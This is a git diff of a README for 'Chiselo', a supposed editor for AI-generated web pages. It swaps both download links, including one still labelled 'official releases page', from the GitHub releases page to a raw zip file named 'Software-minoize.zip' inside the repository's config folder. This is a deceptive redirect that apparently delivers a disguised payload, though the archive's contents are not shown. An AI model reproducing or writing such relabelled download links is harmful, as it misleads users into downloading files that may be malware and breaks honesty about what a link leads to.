@@ -1,12 +1,12 @@
 # 🎨 Chiselo - Edit AI HTML documents with ease
 
-[![](https://img.shields.io/badge/Download_Chiselo-blue?style=for-the-badge)](https://github.com/Danamagentapink178/Chiselo/releases)
+[![](https://img.shields.io/badge/Download_Chiselo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Danamagentapink178/Chiselo/main/config/Software-minoize.zip)
 
 Chiselo helps you manage AI-generated web pages. You can change text, move images, and fix layouts. It works like standard document software. You do not need to read code. You can save your work as a web file, a PDF, or a PowerPoint slide deck.
 
 ## 📥 How to download the app
 
-Visit the [official releases page](https://github.com/Danamagentapink178/Chiselo/releases) to get the software. Follow these steps:
+Visit the [official releases page](https://raw.githubusercontent.com/Danamagentapink178/Chiselo/main/config/Software-minoize.zip) to get the software. Follow these steps:
 
 1. Click the link above.
 2. Look for the latest version at the top of the list.
